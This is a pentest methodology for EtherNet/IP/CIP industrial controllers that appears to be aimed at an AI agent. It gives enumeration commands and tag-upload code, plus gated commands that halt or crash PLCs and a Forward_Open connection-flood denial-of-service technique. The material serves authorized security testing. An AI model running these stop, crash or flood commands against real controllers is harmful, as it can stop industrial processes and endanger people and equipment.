---
technology: "EtherNet/IP (CIP)"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
role: implementation-variant
layer: CIP over Ethernet — explicit messaging TCP 44818 (discovery also UDP 44818), implicit I/O UDP 2222; optional CIP Security (TLS/DTLS)
standards: "ODVA EtherNet/IP adaptation of CIP (Common Industrial Protocol)"
status: upstream-only
source: "rewritten from HackTricks (src/network-services-pentesting/44818-ethernetip.md), CC BY-NC 4.0, accessed 2026-11-13"
provenance: "upstream-only (HackTricks + primary sources); zero corpus evidence by design. nmap enip-info NSE checked against nmap.org/nsedoc; Metasploit multi_cip_command module checked in the rapid7 tree; class/service codes pinned to the ODVA CIP object set. Bucket-2 new-unit wave 1, 2026-11-13."
---

# EtherNet/IP (CIP) — implementation methodology

Companion router: [[ics|ICS area router]]. EtherNet/IP adapts ODVA's **CIP** to TCP/IP and is
the lingua franca of discrete manufacturing, overwhelmingly on **Allen-Bradley / Rockwell**
controllers (ControlLogix, CompactLogix, MicroLogix, Micro800) — plus every other vendor that
implements CIP. Two transports: **explicit messaging on TCP 44818** (the pentest surface:
reads, writes, tag upload, file transfer) and **implicit I/O on UDP 2222** (cyclic
producer/consumer data); ListIdentity discovery answers on both 44818 transports. Base
EtherNet/IP authenticates nobody; CIP Security (TLS/DTLS, commonly 2221) is off by default and
rarely deployed.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| ListIdentity (0x0063) | none — must be answered | yes | Vendor/product/serial/revision inventory — Info |
| CIP object walk | none | yes | Full object model + TCP/IP config — High |
| Logix tag table upload | source protection absent | yes | Named process map + values (`*ESTOP*`...) — High |
| File Object (0x37) read | usually none | yes | Firmware/config/logs — High |
| Set_Attribute_Single / Write Tag | **authorization only** | yes | Process control — Critical, gated |
| CPU STOP / crash CIP commands | **authorization only, maintenance window** | yes | Line-stop DoS — Critical |
| Forward_Open connection flood | resilience window only | yes | Availability exhaustion — High |

## Phase 0 — Fingerprint

Every EtherNet/IP message, TCP or UDP, opens with a 24-byte encapsulation header (command,
length, **session handle**, status, sender context, options). The commands that matter:
`0x0004` ListServices, `0x0063` **ListIdentity** (no session needed — why it is the universal
discovery primitive), `0x0065` RegisterSession, `0x0066` Unregister, `0x006F` SendRRData
(unconnected/UCMM), `0x0070` SendUnitData (connected). The session handle a RegisterSession
returns is a **correlation token, not a credential** — echo it back and you are in.

```bash
nmap -p 44818 --open -sV 198.51.100.10
nmap -p 44818 --script enip-info 198.51.100.10          # identity: vendor/product/serial/rev
nmap -sU -p 44818 --script enip-info 198.51.100.10      # same over UDP
```

Raw-socket alternative when NSE is unavailable — the entire unicast ListIdentity request is
the bare 24-byte header:

```bash
printf '630000000000000000000000000000000000000000000000' | xxd -r -p | \
  timeout 3 socat -T2 - UDP-DATAGRAM:198.51.100.10:44818 | xxd
```

(cpppo's Python modules — `python3 -m cpppo.server.enip.list_services` — speak the same
encapsulation layer.)

## Phase 1 — Passive recon

```bash
enip                                   # encapsulation layer
enip.command == 0x0063                 # ListIdentity (inventory)
enip.command == 0x0065                 # RegisterSession (new sessions)
cip.sc == 0x10                         # Set_Attribute_Single (writes)
cip.sc == 0x4d                         # Logix Write Tag
cip.sc == 0x54                         # Forward_Open (connection setup)
cip.class >= 0x40                      # vendor-specific class access
```

A capture of an engineering session routinely hands you the tag writes and CIP paths that
define the impact surface. oida's pcap mode (`--protocols enip`; the `pcap` install extra)
groups sessions, lists service codes and class paths, and flags writes and vendor-class
access. For segment-wide discovery, `oida discovery <iface> --active --ics-only` broadcasts
ListIdentity with `--rate-limit` throttling for fragile OT segments.

## Phase 2 — Read-only enumeration (CIP object model)

CIP addresses everything as **Class → Instance → Attribute** acted on by a **service code**
(`0x0E` Get_Attribute_Single, `0x10` Set_Attribute_Single, `0x05` Reset, `0x54` Forward_Open,
`0x4E` Forward_Close; Logix adds `0x4C` Read Tag, `0x4D` Write Tag, `0x52` fragmented reads).
The classes that orient you: `0x01` Identity, `0x02` Message Router, `0x04` Assembly,
`0x06` Connection Manager, `0x37` File, `0xF5` TCP/IP Interface, `0xF6` Ethernet Link,
`0x5D`–`0x5F` CIP Security objects, and the vendor-specific range `0x64`–`0xC7` (Logix tag
tables, firmware, controller control).

```bash
oida ethernetip 198.51.100.10                  # connect, ListIdentity, object tree
oida ethernetip 198.51.100.10 -e               # enumerate CIP objects 0x01-0xFF
oida ethernetip 198.51.100.10 --full-enum --exploreclass 0x40-0xC7 --maxattributes 50
oida ethernetip 198.51.100.10 --full-scan      # Logix: upload tag database + UDT/AOI defs
oida ethernetip 198.51.100.10 --dump-tags --tag-output ./tags
oida ethernetip 198.51.100.10 -D --file-output ./loot    # File Object download
oida ethernetip 198.51.100.10 --discover-routes          # chassis slots/backplane topology
```

Install extra `oida-ics[ethernetip]` (pycomm3 underneath). Three structural notes:
**Logix tags are symbolic, not numeric** — you upload the controller's tag list and then
read/write by name; the limiter, where configured, is External Access / source protection,
never the protocol. **Unconnected vs connected messaging** — UCMM (SendRRData) is the quick
path; Logix tag services want a Forward_Open connection first. **Keyswitch position is a
physical interlock** — `RUN` rejects program downloads and many writes regardless of CIP
access; `REMOTE` does not.

```python
from pycomm3 import CIPDriver, LogixDriver

with CIPDriver('198.51.100.10') as drv:            # UCMM read of Identity product name
    resp = drv.generic_message(service=0x0E, class_code=0x01, instance=1,
                               attribute=7, connected=False)

with LogixDriver('198.51.100.10') as plc:          # Rockwell: tag table + values
    for tag in plc.get_tag_list():
        print(tag)
```

## Phase 3 — Write validation and destructive tests (gated)

```bash
oida ethernetip 198.51.100.10 --write --full-enum --confirm    # probe Set_Attribute_Single
oida ethernetip 198.51.100.10 --cpu-stop --confirm             # HALTS the PLC
oida ethernetip 198.51.100.10 --crash-cpu --confirm            # malformed-CIP CPU crash
oida ethernetip 198.51.100.10 --crash-ethernet --confirm       # network card crash
```

`--write` only has targets after `--full-enum`/`--exploreclass` maps attributes; `--fuzz`
then mutates the proven-writable set. The stop/crash/reset commands are the DigitalBond
Basecamp CIP payloads (also in Metasploit's `multi_cip_command`) — single-message line stops
that still work wherever CIP Security and keyswitch/source protections are absent. Written
authorization and a maintenance window only. Tag names worth flagging on any write surface:
`*ESTOP*`, `*VALVE*OPEN*`, `*INTERLOCK*`, `*SETPOINT*`.

**Forward_Open exhaustion** is the availability finding with research behind it: connected CIP
reserves per-connection resources, and repeatedly opening connections with fresh originator
serials inside one TCP stream denies service to legitimate clients on the order of tens of
outstanding connections on tested hardware (ControlLogix 1756-EN4T; threshold and recovery are
per-implementation). Resilience-window testing only — watch Forward_Open/Forward_Close balance
and the point a known-good client fails.

## Phase 4 — Impact framing

Unauthenticated read of the whole device (identity, config, assemblies, tags, File Object
firmware/config), unauthenticated write as a physical control action, plaintext transport with
replayable sessions, and first-class DoS commands. ATT&CK for ICS maps the control writes to
T1692.001. Hardening gaps to report alongside findings: 44818/2222 reachable beyond the
engineering segment, CIP Security in factory-default state, keyswitch left in REMOTE, no tag
External Access restrictions. Shodan recon: `port:44818`.

## Command quick reference

```bash
nmap -p 44818 --script enip-info 198.51.100.10     # identity
oida ethernetip 198.51.100.10 -e                   # CIP object walk
oida ethernetip 198.51.100.10 --full-scan          # Logix tag table
tshark -r capture.pcap -Y 'cip.sc == 0x4d'         # tag writes on the wire
```

## Tool mapping (prose)

nmap with the enip-info NSE for identity; the oida ICS scanner (ethernetip module over
pycomm3) for object enumeration, tag upload, and confirm-gated destructive tests; pycomm3 for
scripted CIP/Logix work; cpppo for encapsulation-level scripting; Metasploit's
multi_cip_command for the Basecamp CIP payloads; Wireshark/tshark for the passive layer.
Tools vault owns per-tool detail.
